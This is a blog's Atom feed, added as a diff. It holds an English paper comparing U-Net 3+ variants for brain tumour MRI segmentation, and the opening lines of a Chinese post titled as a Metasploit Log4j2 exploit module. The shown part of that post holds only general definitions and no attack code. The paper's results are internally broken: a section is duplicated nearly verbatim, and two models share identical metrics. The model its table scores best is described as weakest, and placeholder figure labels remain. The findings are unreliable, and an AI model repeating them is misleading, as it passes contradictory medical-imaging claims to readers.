@@ -1,0 +1,770 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://abraxasfever.github.io/</id>
+    <title>执徐的小博客</title>
+    <updated>2024-09-19T03:53:31.577Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://abraxasfever.github.io/"/>
+    <link rel="self" href="https://abraxasfever.github.io/atom.xml"/>
+    <subtitle>con argucia feroz su hilo de hielo,
+brotó un clavel bajo su fina punta
+en tu negro jubón de terciopelo.</subtitle>
+    <logo>https://abraxasfever.github.io/images/avatar.png</logo>
+    <icon>https://abraxasfever.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, 执徐的小博客</rights>
+    <entry>
+        <title type="html"><![CDATA[Comparative Study of Deep Learning Models for Brain Tumor MRI Segmentation: Application of U-Net 3+ and Its Variants]]></title>
+        <id>https://abraxasfever.github.io/post/shen-du-xue-xi/</id>
+        <link href="https://abraxasfever.github.io/post/shen-du-xue-xi/">
+        </link>
+        <updated>2024-09-04T06:37:12.000Z</updated>
+        <content type="html"><![CDATA[<p>Abstract: This paper presents and compares five deep-learning models based on the U-Net 3+ architecture for the automatic segmentation of brain tumours in MRI images. These complex models range from a basic U-Net 3+ to more advanced variants incorporating EfficientNet encoders, depth-wise separable convolutions, and Squeeze-and-Excitation attention mechanisms. Experiments conducted on a public dataset demonstrate significant differences in segmentation accuracy, computational efficiency, and detail handling among the models. The fully attention-based model achieves the highest segmentation accuracy, particularly in handling complex boundaries and details, albeit with higher computational complexity. In contrast, the baseline model offers the highest computational efficiency but is less effective in handling complex features. This comparative study guides model selection in resource-constrained environments and applications requiring high precision.</p>
+<ol>
+<li>Introduction<br>
+1.1.	Background<br>
+Medical image segmentation is an important field in modern medical research and clinical applications[1]. Its core task is to automatically or semi-automatically segment different anatomical structures or lesion regions in medical images, which is important for many aspects such as disease diagnosis, treatment planning, lesion tracking, and preoperative and intraoperative navigation. In recent years, with the explosive growth of medical image data and the rapid development of artificial intelligence technology[2], deep learning-based medical image segmentation methods have become a research hotspot and have shown unprecedented results in many tasks.<br>
+Among many deep learning models, the U-Net model has been widely used and achieved great success in medical image segmentation since its proposal with its unique encoder-decoder structure and jump connection mechanism[3]. The U-Net model makes it possible to accurately capture the boundary information of the target region while maintaining the spatial resolution of the image by efficiently integrating the low-level features and high-level features[4]. However, despite the excellent performance of U-Net in many application scenarios, it still has some challenges when dealing with complex lesions such as brain tumours, which are highly heterogeneous and have fuzzy boundaries, such as insufficient sensitivity to small targets, limitations in feature extraction, and insufficient robustness to unbalanced data[5-7].<br>
+Brain tumour segmentation is an important and challenging task in medical image segmentation[8-12]. The variable growth patterns of brain tumours, the complex and varied representations of tumour regions in MRI images, and the frequent interference with other lesions or tissues make accurate segmentation particularly difficult[13-17]. Traditional segmentation methods, such as those based on region growth, edge detection and threshold segmentation, are often incompetent in dealing with such complex scenarios[18]. Deep learning-based segmentation methods, especially convolutional neural networks (CNNs), have gradually become the mainstream method to solve this problem through their powerful feature extraction capability and end-to-end learning approach[19-23].<br>
+1.2.	Research Motivation<br>
+Although U-Net and its improved models such as U-Net++ and Attention U-Net have made significant progress in brain tumour segmentation tasks, however, there is still much room for exploration and optimisation in the face of the high complexity of medical image data and the imbalance of datasets[24]. Firstly, the original U-Net model is insufficient in the depth and width of feature extraction, which cannot fully capture the detailed information at different scales in the image[25], [26]. Secondly, when facing brain tumours, which are lesions with diverse structures and fuzzy boundaries, the traditional convolution operation is prone to ignore some important contextual information[27], [28]. In addition, the unbalanced nature of medical image data often leads to the model not being sensitive enough to identify the tumour region, thus affecting the segmentation accuracy[29], [30], [31]. In recent years, researchers have proposed some improvement strategies to enhance the feature extraction ability and noise immunity of the model in order to address these problems. For example, the introduction of the attention mechanism enables the model to focus on more important feature regions and improves the model's perceptual ability[32]. Deeply separable convolution enables the model to handle detailed letters better while maintaining high efficiency by reducing the number of parameters and computations[33]. EfficientNet, as a novel network architecture, has also been gradually gaining attention in medical image analysis due to its efficient parameter utilisation and excellent performance[34]. Therefore, exploring the integrated application of these new techniques in the U-Net architecture may provide new solutions for brain tumour segmentation.<br>
+1.3.	research target<br>
+This study aims to design and evaluate several improvement schemes based on the U-Net3Plus model for the task of brain tumour segmentation, to improve the accuracy and robustness of the segmentation. The specific research objectives are as follows:<br>
+Design and implementation of different variants of the U-Net3Plus model: This study will explore the U-Net3Plus model integrating the attention mechanism, deep separable convolution, and the EfficientNet encoder, and experimentally validate the impact of these improvements on brain tumour segmentation performance.</li>
+<li>Evaluating model performance in brain tumour segmentation tasks: On a publicly available brain tumour segmentation dataset, the performance of different models is systematically evaluated, comparing their strengths and weaknesses in terms of segmentation accuracy, computational efficiency, and ability to handle complex structures.</li>
+<li>Analyse the impact of different loss functions on the model training effect: Explore how the loss function settings, such as weighted BCEWithLogitsLoss, affect the training process and final segmentation results of the model on the unbalanced dataset, and provide references for solving the data imbalance problem.</li>
+<li>Propose an optimised model scheme for brain tumour segmentation: Combine the experimental results and quantitative analysis to propose the most suitable model structure for brain tumour segmentation, and discuss the possible directions of further optimisation, such as the lightweight design of the model and the integrated application of multimodal images.<br>
+This study not only provides a series of improved model methods for brain tumour segmentation, but also provides valuable insights and directions for future medical image segmentation research through systematic experiments and analysis. It is hoped that the results of this study will further promote the popularity and development of brain tumour segmentation technology in practical clinical applications.</li>
+<li>Related Work<br>
+2.1.	Overview of Medical Image Segmentation<br>
+Medical image segmentation is a key task in the field of computer vision, aiming to accurately segment different anatomical structures or lesion regions in medical images[35]. With the improvement of computing power and the accumulation of large-scale medical image data, image segmentation techniques based on deep learning have become the mainstream direction of research[36]. Medical image segmentation has a wide range of application scenarios, including but not limited to tumour detection, organ contour extraction, and surgical planning[37].<br>
+Traditional image segmentation methods such as region growing, active contour modelling and graph cut are often difficult to handle complex medical image data as they rely on predefined a priori knowledge and manual parameter tuning[38]. In addition, these methods are usually sensitive to noise and susceptible to artefacts in the image, leading to inaccurate segmentation. In recent years, deep learning methods, especially CNNs, have shown excellent performance in image segmentation. These methods greatly improve the accuracy and robustness of segmentation by automatically learning the multilevel features of an image[39].<br>
+2.2.	U-Net and its variants<br>
+The U-Net model was first proposed in 2015 by Ronneberger et al. and was initially used for the task of segmentation of cellular images[40]. The U-Net model employs a symmetric encoder-decoder structure, where the encoder is used to extract multiscale features of the image, and the decoder combines the low-level features in the encoder with the high-level features via jump connections to recover high-resolution segmentation Results. Due to the effectiveness and easy scalability of its structure, U-Net has quickly become a standard model for medical image segmentation and has been widely used in many fields[41].<br>
+To further enhance the performance of the U-Net model, researchers have proposed several improved versions. U-Net++ enhances the interaction between features at different scales by introducing dense jump connections and a deeper network structure, thus improving the accuracy of segmentation[42]. Attention U-Net incorporates an attention mechanism in the jump connections, which allows the model to adaptively select the most favourable features for the segmentation task, improving the robustness and accuracy of the model[43]. The most favourable features of the segmentation task improves the robustness and accuracy of the model. In addition, 3D U-Net extends U-Net to the structure of 3D convolution, enabling the model to better handle 3D medical images such as CT and MRI data[44].<br>
+2.3.	Brain tumour segmentation technique<br>
+Brain tumour segmentation is an important application area in medical image segmentation with significant clinical value. Accurate brain tumour segmentation can help doctors make accurate diagnosis and treatment plans. However, brain tumour representations in medical images are usually complex and varied, the boundaries between the tumour region and the surrounding tissues are often blurred, and the tumours are highly heterogeneous in morphology and size, which makes the segmentation task extremely challenging[45].<br>
+Early brain tumour segmentation methods mainly relied on hand-designed features and image processing-based algorithms such as threshold segmentation, region growth and morphological manipulation[46]. Although these methods can achieve some results in specific cases, they usually rely on preset parameters and are difficult to cope with image data generated from different patients and different devices.<br>
+With the rise of deep learning, brain tumour segmentation methods based on convolutional neural networks have gradually become mainstream[47]. The success of the BraTS challenge has driven the rapid development of such methods.[48] Among these methods, U-Net and its variant models are widely used, and researchers continue to improve the accuracy of brain tumour segmentation by introducing different structural improvements and data enhancement strategies. For example, the V-Net model significantly improves the segmentation of 3D MRI data by using 3D convolution and residual concatenation, while the DeepMedic model achieves good segmentation at different scales by using a two-channel convolutional neural network to process low- and high-resolution image data separately.<br>
+2.4.	Attentional Mechanisms in Medical Image Segmentation<br>
+Attention mechanisms were first proposed in the field of natural language processing, and have been gradually introduced into the field of computer vision in recent years, especially in image segmentation tasks[49]. The attention mechanism enables the model to better handle images with complex backgrounds or high noise by dynamically adjusting the model's attention to features in different regions.[50]<br>
+In medical image segmentation, the attention mechanism is effective in improving segmentation accuracy[51]. The Attention U-Net model proposed by Wang et al. By introducing an attention module into the jump connections of U-Net, the model can focus on the lesion region more accurately while reducing the sensitivity to background noise. [52]Since then, researchers have further proposed various improved attention mechanisms, such as the self-attention mechanism and the multi-head attention mechanism, to further enhance the model performance. In addition, a convolutional attention module combining a long short-term memory network (LSTM) and a convolutional neural network has also been applied to segmentation tasks of time-series images, such as dynamic MRI segmentation of the heart[53].<br>
+2.5.	Deep Separable Convolution with EfficientNet<br>
+Depthwise Separable Convolution (DSC) is an efficient convolution operation proposed in recent years, which significantly reduces the number of parameters and computation of the model by decomposing the standard convolution into depthwise convolution and point-by-point convolution while maintaining the expressive power of the model to a certain extent[54]. This convolution operation has been successfully applied in many lightweight neural networks, such as MobileNet and Xceptio.<br>
+EfficientNet is a new neural network architecture proposed by Google Research, which has demonstrated excellent performance and effectiveness in several computer vision tasks with its multi-dimensional scaling strategy based on composite coefficients, including width, depth, and resolution[55]. EfficientNet utilises techniques such as depth-separable convolution and automatic search for hyperparameters, which greatly improves the model's computational efficiency. EfficientNet has been successfully applied as an encoder in medical image segmentation tasks and has shown good results[56].<br>
+2.6.	Application of Loss Functions to Unbalanced Datasets<br>
+Medical image data are usually highly unbalanced, i.e., the pixel share of the lesion region is much smaller than that of the background region[57]. Traditional loss functions such as Cross-Entropy Loss (CEL) tend to cause the model to be biased towards predicting the majority class when dealing with unbalanced data, which leads to unsatisfactory segmentation results. To solve this problem, researchers have proposed a variety of improved loss functions.<br>
+Weighted Cross-Entropy Loss allows the model to focus more on fewer classes during training by assigning different weights to different classes. In addition, Dice Loss and IoU Loss, which are optimised directly based on the overlap metric of the segmentation results, have been shown to perform better on unbalanced datasets. Recently, some studies have combined the advantages of different loss functions, such as Tversky Loss and Focal Loss, which show excellent performance when dealing with small targets and complex backgrounds[58].<br>
+2.7.	Innovations and differences in this study<br>
+Although a large number of studies have explored the U-Net and its variants on the model, there is still a lot of under-explored potential in the field of brain tumour segmentation. The innovative aspect of this study is:</li>
+<li>Introduction of multiple novel model structures: This study explores the integration of the Attention mechanism, deep separable convolution and EfficientNet encoder in the U-Net3Plus model, to achieve better results in brain tumour segmentation.</li>
+<li>Comprehensive evaluation of different loss functions: To address the imbalance problem in brain tumour datasets, this study compares in detail the performance of loss functions such as weighted cross entropy and Dice loss in model training, which provides a new perspective for dealing with imbalanced datasets.</li>
+<li>Systematic experimental validation: This study designed comprehensive experiments using different models, different loss functions and their combinations, conducted comparative analyses, and systematically evaluated their respective strengths and weaknesses, providing a reference basis for future research and applications.<br>
+By integrating and innovating the current state-of-the-art techniques, this study not only achieved good experimental results in the brain tumour segmentation task, but also provided new methods and ideas for future medical image segmentation research.</li>
+<li>Methodology<br>
+3.1.	Model Architecture Overview<br>
+The main goal of this study is to develop an efficient and accurate brain tumour segmentation model that can provide competitive performance when dealing with complex medical imaging data. To achieve this goal, we have made several improvements and optimisations based on the classical U-Net architecture, resulting in several different model variants. Each variant aims to improve the segmentation accuracy and computational efficiency of the model by introducing different state-of-the-art techniques, such as the attention mechanism, deep separable convolution and EfficientNet encoder.<br>
+Firstly, we constructed several variant models based on the U-Net3Plus model, each of which maintains the same encoder-decoder symmetric structure at its core but introduces specific enhancement mechanisms at different levels. These variant models are innovatively improved in several key aspects, such as feature extraction, feature fusion and segmentation result generation, and finally form a segmentation framework with excellent performance.<br>
+3.2.	U-Net3Plus model<br>
+The U-Net3Plus model is an important extension to the U-Net architecture, aiming to enhance the model's ability to capture multi-scale information by improving the feature fusion strategy. Compared with the traditional U-Net model, U-Net3Plus not only uses feature maps from the corresponding encoder layer, but also fuses multiple feature maps from different scales at each decoding stage, which enables the model to have stronger expressive ability in segmenting small targets and detailed regions.<br>
+In the U-Net3Plus model, the encoder part mainly consists of five convolutional blocks, each of which consists of two convolutional operations and one downsampling operation to extract the multiscale features of the input image respectively. The decoder part then gradually recovers the resolution of the original image through the fusion of multi-scale features. Specifically, each stage of the decoder splices the up-sampled features of the current layer with the feature maps extracted from different coding layers to form a feature map containing rich semantic information. Eventually, the decoder generates high-resolution segmentation results through a series of convolution operations.<br>
+3.3.	Introduction of the attention mechanism<br>
+In medical image segmentation tasks, target regions often account for a small percentage of the image and have complex shapes and texture structures. In order to improve the model's attention to these target regions, this study introduces an attention mechanism based on the U-Net3Plus model.<br>
+Specifically, we incorporate a channel attention mechanism (SE Block) at the jump junctions in the decoder section.The SE Block enables the model to pay more attention to important features related to the target while suppressing irrelevant features related to the background during the feature fusion process by adaptively adjusting the weights of each channel.The specific operation of the SE Block consists of firstly performing a global average pooling on the input feature map Global average pooling is performed to obtain the global information of each channel, then the weights of each channel are calculated through a series of fully connected layers and activation functions, and finally these weights are applied to the original feature map to form a weighted feature map for the next step.<br>
+By introducing the attention mechanism, the model can identify and segment the target region more accurately in the face of complex backgrounds and noise, thus improving the accuracy of segmentation.<br>
+3.4.	Applications of Deeply Separable Convolution<br>
+Depthwise Separable Convolution (DSC) is a more computationally efficient convolution operation that decomposes the standard convolution into two parts, depth convolution and point-by-point convolution, which significantly reduces the number of parameters and computation of the model.<br>
+In this study, we apply deep separable convolution to the encoder and decoder portions of the U-Net3Plus model, replacing the traditional standard convolution operation. Specifically, deep convolution first performs the convolution operation independently on each input channel, thus preserving the independence between channels. Next, point-by-point convolution fuses the information from all channels through 1x1 convolution to form a new feature map. In this way, deep separable convolution drastically reduces the computational cost while guaranteeing the feature extraction capability, enabling the model to handle larger datasets with limited computational resources.<br>
+3.5.	Integration of EfficientNet encoders<br>
+To further improve the feature extraction capability of the model, we use EfficientNet as an encoder in some of the model variants.EfficientNet is an efficient convolutional neural network based on a composite coefficient scaling strategy, which enables the model to have strong expressive power while maintaining low computational complexity by integrally adjusting the width, depth and resolution of the network .<br>
+Specifically, each block of EfficientNet consists of multiple Inverted Residual Blocks that are enhanced for feature extraction by depth-separable convolution, expansion and contraction operations, and jump connections. In this study, we use the EfficientNet encoder in conjunction with the decoder part of U-Net3Plus, which enables the model to process high-resolution medical images with both global information and local details, thus improving the accuracy of the segmentation results.<br>
+3.6.	Loss function design and training strategy<br>
+The problem of category imbalance often exists in medical image data, i.e. the target region of interest (e.g. tumour) is extremely under-represented compared to the background region. In order to solve this problem, we designed various loss functions during model training and adopted appropriate training strategies.<br>
+First, we used the weighted BCEWithLogitsLoss as the base loss function. By setting different weights for each class, we enable the model to pay more attention to the minority class during the training process, avoiding the problem that the loss function is biased towards the majority class in most cases. In addition, we also tried loss functions specifically for the segmentation task such as Dice loss and IoU loss to further optimise the segmentation effect of the model.<br>
+During the training process, we also introduce strategies such as learning rate scheduler and gradient trimming to ensure the stability and convergence of the model during training. The learning rate scheduler dynamically adjusts the learning rate so that the model can learn quickly in the early stage of training and converge stably in the late stage of training to avoid overfitting. Gradient trimming ensures stable training of the model by limiting the maximum value of the gradient and preventing the gradient from exploding during backpropagation.<br>
+3.7.	Experimental design and evaluation indicators<br>
+In order to comprehensively evaluate the performance of the proposed model variants, a series of experiments were designed in this study and multiple evaluation metrics were used for performance comparison. Specifically, we selected the brain tumour segmentation dataset and divided it into a training set and a testing set. During the experiments, we trained each model variant several times and recorded the changes in loss values during the training process.<br>
+In order to evaluate the segmentation performance of the model, we use several indicators including mIoU (average intersection ratio), Dice coefficient, Accuracy and Precision. These metrics can reflect the segmentation effect of the model from different perspectives, e.g., mIoU and Dice coefficient are mainly used to assess the degree of overlap between the segmentation results and the real labels, while Accuracy and Precision are used to assess the overall prediction accuracy of the model and the ability to recognise the positive classes, respectively.<br>
+Through these experiments and evaluations, we were able to systematically analyse the advantages and disadvantages of different model structures and training strategies, and provide valuable references for future research.<br>
+3.8.	Implementation details<br>
+In order to ensure the reproducibility of the experimental results and the practical applicability of the model, this study is also designed in detail in the implementation details. We used PyTorch as the deep learning framework and used Mixed Precision Training (MPT) in the training process to speed up the training. All experiments were conducted in an environment with NVIDIA GPUs, which ensured that the model could be trained in a reasonable amount of time.<br>
+In addition, we also recorded the loss changes and evaluation metrics during the training process via TensorBoard, making the whole experiment process well visualised. This not only helps us to monitor the performance of the model in real time during the training process, but also provides detailed data support for subsequent analyses and reports.</li>
+<li>Models Overview<br>
+4.1.	U-Net 3+ (Baseline):<br>
+Description: The basic model retains the core structure of U-Net 3+, focusing on a symmetric encoder-decoder architecture.<br>
+Strengths: High computational efficiency.<br>
+Weaknesses: Less effective in handling complex features and boundaries.</li>
+</ol>
+<p><img src="https://abraxasfever.github.io//post-images/1726322482456.png" alt="" loading="lazy"><br>
+Figure 1:U-Net 3+ Model Architecture</p>
+<p>4.2.	U-Net 3+ with HDC (Test_batch2_HDC):<br>
+Description: Introduces Hybrid Dilated Convolution (HDC) to capture features at various scales more effectively.<br>
+Strengths: Improved feature extraction capability and better handling of complex structures.<br>
+Weaknesses: Exhibits significant fluctuations during training, indicating potential stability issues.</p>
+<p><img src="https://abraxasfever.github.io//post-images/1726322404686.png" alt="" loading="lazy"><br>
+Figure 2: HDC Decoder Architecture in U-Net 3+ Model</p>
+<p>4.3.	U-Net 3+ with HDC and Deep Convolution (Test_batch2_HDC_DEEP):<br>
+Description: Combines HDC with deep separable convolutions, further enhancing feature extraction and reducing computational load.<br>
+Strengths: Best overall performance in terms of convergence, stability, and final loss values. It has a smooth and stable learning curve, making it the top-performing model in this comparison.<br>
+Weaknesses: Slightly more computationally demanding compared to the baseline.</p>
+<p><img src="https://abraxasfever.github.io//post-images/1726322389067.png" alt="" loading="lazy"><br>
+Figure 3: Deep Separable Convolution Process</p>
+<p>4.4.	U-Net 3+ with HDC and EfficientNet (Test_batch2_HDC_EFF):<br>
+Description: Utilizes EfficientNet as the encoder, known for its efficient parameter utilization and superior performance.<br>
+Strengths: Achieves good convergence and stability, with a balanced approach to feature extraction and computational efficiency.<br>
+Weaknesses: Although it performs well, it doesn't match the stability and low loss achieved by the HDC_DEEP variant.</p>
+<p><img src="https://abraxasfever.github.io//post-images/1726322350068.png" alt="" loading="lazy"><br>
+Figure 4: EfficientNet Encoder in U-Net 3+ Model</p>
+<p>4.5.	U-Net 3+ with Squeeze-and-Excitation (SE) Block (Test_batch2_Squeeze):<br>
+Description: Incorporates the SE Block, focusing on channel-wise attention to enhance important features.<br>
+Strengths: Improved attention to significant features, potentially beneficial in highly noisy environments.<br>
+Weaknesses: Slower convergence and higher volatility during training, resulting in higher final loss values compared to other models.</p>
+<p><img src="https://abraxasfever.github.io//post-images/1726322425216.png" alt="" loading="lazy"><br>
+Figure 5: Attention Mechanism in U-Net 3+ Model</p>
+<ol start="5">
+<li>Analysis of Training Loss and Convergence<br>
+5.1.	Experimental Results<br>
+In this section, we present the comparative analysis of the training loss curves for different models trained on the brain tumour segmentation dataset. The models under consideration include HDC_30_b2, HDC_DEEP_30_b2, HDC_EFF_30_b2, Squeeze_30_b2, and UNet3+_30_b2. The training process was carried out over 14,399 steps, and the loss values were recorded at each step. The graph in Figure X displays the loss curves, providing insights into each model's performance in terms of convergence speed, final loss value, and stability.<br>
+5.2.	Model Convergence Analysis<br>
+As seen in Figure 6, all the models show a steep initial drop in loss during the early stages of training, which is a common pattern in deep learning as the models quickly learn basic patterns from the data. However, the rate of loss reduction slows down after around 4,000 steps, with models converging towards their final loss values.<br>
+•	HDC_DEEP_30_b2 (black curve) achieves the best performance with the lowest final loss value of 0.0009. This indicates that this model has learned the most accurate representations for the given task. It also converges relatively quickly, maintaining low volatility after 4,000 steps.<br>
+•	HDC_EFF_30_b2 (blue curve) follows closely, with a final loss of 0.0011. While this model does not quite match the accuracy of HDC_DEEP_30_b2, it demonstrates a consistent reduction in loss with minimal fluctuations after 4,000 steps, showing a smooth convergence pattern.<br>
+•	UNet3+_30_b2 (yellow curve) also performs well, reaching a final loss of 0.001. Although it achieves a low final loss, the model exhibits more fluctuations throughout the training process, indicating less stability compared to the other models.<br>
+•	HDC_30_b2 (purple curve) and Squeeze_30_b2 (orange curve) exhibit slightly higher final losses of 0.0036 and 0.0035, respectively. Both models show relatively consistent performance but with more noticeable volatility during the training, particularly between 2,000 and 10,000 steps.<br>
+5.3.	Model Stability Analysis<br>
+Stability is a key indicator of a model's robustness. From the loss curves in Figure 6, we observe that HDC_DEEP_30_b2 and HDC_EFF_30_b2 demonstrate the highest stability, with relatively smooth curves and minimal fluctuations in the latter stages of training. This suggests that these models generalize well to the training data and do not exhibit overfitting or instability issues.<br>
+•	Squeeze_30_b2 and UNet3+_30_b2 exhibit more volatility, which could indicate that these models are more sensitive to certain data batches or require further hyperparameter tuning to achieve more consistent performance.<br>
+•	HDC_30_b2, despite achieving good convergence, shows more pronounced fluctuations, particularly before 10,000 steps, which suggests that the model may struggle with data generalization in certain cases.<br>
+5.4.	Comparative Performance<br>
+The overall performance of each model can be summarized as follows:<br>
+Figure 7: Model Performance Metrics (mIoU, Precision, Recall)<br>
+•	HDC_DEEP_30_b2 emerges as the top-performing model, achieving the lowest final loss value and exhibiting excellent stability throughout the training process.<br>
+•	HDC_EFF_30_b2 follows closely behind, with slightly higher loss values but good stability, making it another strong candidate for segmentation tasks.<br>
+•	UNet3+_30_b2 demonstrates competitive performance but shows higher volatility, which might require further adjustments in terms of batch size or learning rate.<br>
+•	HDC_30_b2 and Squeeze_30_b2 perform relatively well but are outperformed by the other models in terms of stability and final loss values, indicating room for optimization.<br>
+5.5.	Summary of Results<br>
+The experimental results highlight the strengths and weaknesses of each model. HDC_DEEP_30_b2 and HDC_EFF_30_b2 are the most promising architectures for the brain tumor segmentation task, as they demonstrate faster convergence, better stability, and lower loss values. Squeeze_30_b2 and UNet3+_30_b2 show decent performance but require further adjustments to improve their stability and final loss. These results provide valuable insights into the effectiveness of different architectures and inform future efforts to optimize these models for medical image segmentation tasks.</li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://abraxasfever.github.io//post-images/1726322538572.png" alt="" loading="lazy"></figure>
+<ol start="6">
+<li>Quantitative Analysis of Segmentation Models<br>
+In this section, we present the comparative analysis of the training loss curves for different models trained on the brain tumor segmentation dataset. The models under consideration include HDC_30_b2, HDC_DEEP_30_b2, HDC_EFF_30_b2, Squeeze_30_b2, and UNet3+_30_b2. The training process was carried out over 14,399 steps, and the loss values were recorded at each step. The graph in Figure 7 displays the loss curves, providing insights into each model's performance in terms of convergence speed, final loss value, and stability.<br>
+MODEL	MIOU (%)	MPA (%)	PRECISION (%)	RECALL (%)	TRAINING TIME (HR)<br>
+HDC	94.94	95.88	98.90	95.88	6.705<br>
+HDC_DEEP	94.94	95.88	98.90	95.88	6.331<br>
+HDC_EFF	94.79	95.92	98.78	95.62	6.804<br>
+UNET3+	94.83	96.03	98.59	96.03	6.713<br>
+SQUEEZE	96.07	98.25	97.66	98.25	6.529<br>
+6.1.	Model Convergence Analysis<br>
+As seen in Figure 7, all the models show a steep initial drop in loss during the early stages of training, which is a common pattern in deep learning as the models quickly learn basic patterns from the data. However, the rate of loss reduction slows down after around 4,000 steps, with models converging towards their final loss values.<br>
+•	HDC_DEEP_30_b2 (black curve) achieves the best performance with the lowest final loss value of 0.0009. This indicates that this model has learned the most accurate representations for the given task. It also converges relatively quickly, maintaining low volatility after 4,000 steps.<br>
+•	HDC_EFF_30_b2 (blue curve) follows closely, with a final loss of 0.0011. While this model does not quite match the accuracy of HDC_DEEP_30_b2, it demonstrates a consistent reduction in loss with minimal fluctuations after 4,000 steps, showing a smooth convergence pattern.<br>
+•	UNet3+_30_b2 (yellow curve) also performs well, reaching a final loss of 0.001. Although it achieves a low final loss, the model exhibits more fluctuations throughout the training process, indicating less stability compared to the other models.<br>
+•	HDC_30_b2 (purple curve) and Squeeze_30_b2 (orange curve) exhibit slightly higher final losses of 0.0036 and 0.0035, respectively. Both models show relatively consistent performance but with more noticeable volatility during the training, particularly between 2,000 and 10,000 steps.<br>
+6.2.	Model Stability Analysis<br>
+Stability is a key indicator of a model's robustness. From the loss curves in Figure X, we observe that HDC_DEEP_30_b2 and HDC_EFF_30_b2 demonstrate the highest stability, with relatively smooth curves and minimal fluctuations in the latter stages of training. This suggests that these models generalize well to the training data and do not exhibit overfitting or instability issues.<br>
+•	Squeeze_30_b2 and UNet3+_30_b2 exhibit more volatility, which could indicate that these models are more sensitive to certain data batches or require further hyperparameter tuning to achieve more consistent performance.<br>
+•	HDC_30_b2, despite achieving good convergence, shows more pronounced fluctuations, particularly before 10,000 steps, which suggests that the model may struggle with data generalization in certain cases.<br>
+6.3.	Comparative Performance<br>
+The overall performance of each model can be summarized as follows:<br>
+•	HDC_DEEP_30_b2 emerges as the top-performing model, achieving the lowest final loss value and exhibiting excellent stability throughout the training process.<br>
+•	HDC_EFF_30_b2 follows closely behind, with slightly higher loss values but good stability, making it another strong candidate for segmentation tasks.<br>
+•	UNet3+_30_b2 demonstrates competitive performance but shows higher volatility, which might require further adjustments in terms of batch size or learning rate.<br>
+•	HDC_30_b2 and Squeeze_30_b2 perform relatively well but are outperformed by the other models in terms of stability and final loss values, indicating room for optimization.<br>
+6.4.	Summary of Results<br>
+The experimental results highlight the strengths and weaknesses of each model. HDC_DEEP_30_b2 and HDC_EFF_30_b2 are the most promising architectures for the brain tumour segmentation task, as they demonstrate faster convergence, better stability, and lower loss values. Squeeze_30_b2 and UNet3+_30_b2 show decent performance but require further adjustments to improve their stability and final loss. These results provide valuable insights into the effectiveness of different architectures and inform future efforts to optimize these models for medical image segmentation tasks.</li>
+<li>Qualitative Comparison of Segmentation Results<br>
+In addition to the quantitative evaluation metrics such as mIoU, mPA, precision, and recall, we conducted a qualitative comparison of the segmentation performance across different models. Figure 8 shows the segmentation output of various models, including HDC, HDC_EFF, HDC_DEEP, Basic, and Squeeze, alongside the ground truth result for a specific brain tumor segmentation case.<br>
+As seen in the figure, all models have successfully identified the tumor region, demonstrating effective segmentation capability. However, subtle differences in the shape and size of the segmented regions can be observed. The HDC model variants (HDC, HDC_EFF, and HDC_DEEP) tend to produce more consistent and well-defined segmentation boundaries compared to the Basic and Squeeze models.</li>
+</ol>
+<p><img src="https://abraxasfever.github.io//post-images/1726322721828.png" alt="" loading="lazy"><br>
+Figure 8: Segmentation Results Comparison</p>
+<p>•	HDC vs. HDC_EFF: Both models show highly accurate segmentation, but HDC_EFF tends to be slightly more consistent in capturing the exact boundaries of the tumour, likely due to its more efficient feature extraction process.<br>
+•	HDC_DEEP: The deeper architecture variant shows comparable performance to HDC and HDC_EFF, maintaining the same level of detail in the segmented tumour area.<br>
+•	Basic Model: While performing reasonably well, the Basic model exhibits slight deviations in the boundary definition, which could impact its overall segmentation accuracy, as seen in the quantitative metrics.<br>
+•	Squeeze Model: The Squeeze model also performs well, though it occasionally misses finer details of the tumour shape, as evidenced by minor boundary discrepancies.<br>
+In conclusion, the visual comparison complements the quantitative evaluation, reinforcing that the HDC and its variants (HDC_EFF, HDC_DEEP) offer superior segmentation quality compared to the Basic and Squeeze models.<br>
+8.	Conclusion<br>
+In this study, we explored the application of several deep learning models, particularly U-Net 3+ and its variants, for the task of brain tumour segmentation using MRI data. The results indicate that while the baseline U-Net 3+ model offers computational efficiency, the introduction of advanced techniques such as Hybrid Dilated Convolutions (HDC), Deep Convolution, EfficientNet encoders, and Squeeze-and-Excitation Blocks significantly enhances the model's ability to capture complex tumor boundaries and intricate details.<br>
+Among the models evaluated, the U-Net 3+ with HDC and Deep Convolution (HDC_DEEP) exhibited the best overall performance in terms of segmentation accuracy, convergence stability, and computational efficiency. The use of attention mechanisms and depth-wise separable convolutions in this variant allowed for superior handling of complex lesion structures while maintaining a reasonable computational load. The model also demonstrated smooth learning curves and stability throughout the training process, making it a strong candidate for further development in real-world medical applications.<br>
+In contrast, models incorporating EfficientNet and Squeeze-and-Excitation Blocks showed strong potential but fell slightly behind in terms of stability and computational demands. Nevertheless, these models performed well in noisy environments, making them suitable for applications requiring high precision in challenging conditions.<br>
+The experimental results presented in this study provide a comprehensive evaluation of different model architectures, offering insights into the trade-offs between computational efficiency and segmentation accuracy. Future work may focus on further optimizing these models by exploring multimodal data integration and lightweight architectures, as well as addressing class imbalance in medical datasets through improved loss function designs. These enhancements have the potential to push the boundaries of automated brain tumor segmentation, improving clinical outcomes through more accurate and reliable image analysis.</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[基于Metasploit的Log4j2漏洞利用模块]]></title>
+        <id>https://abraxasfever.github.io/post/ji-yu-metasploit-de-log4j2-lou-dong-li-yong-mo-kuai/</id>
+        <link href="https://abraxasfever.github.io/post/ji-yu-metasploit-de-log4j2-lou-dong-li-yong-mo-kuai/">
+        </link>
+        <updated>2022-06-13T14:39:53.000Z</updated>
+        <content type="html"><![CDATA[<p>第一章  	绪论<br>
+1.1 	研究背景<br>
+1.1.1 	网络安全的定义和内容<br>
+犯罪不仅仅发生在现实世界中。在信息技术发展的时代，网络空间也成为了某些人的犯罪场所。也因此产生了很多新型的犯罪行为，如非法访问，盗窃个人数据，抢劫机密数据等，这些利用计算机作为媒介或目标的犯罪行为被称为网络空间犯罪。<br>
+保障在网络空间合法的使用者免受网络犯罪的侵害需要安全的网络，网络安全是指组织为保护组织免受使用网络渠道的网络犯罪分子和威胁而采取的保护措施和协议。网络安全对于业务连续性以及保护数据和用户以及公司免受风险至关重要。<br>
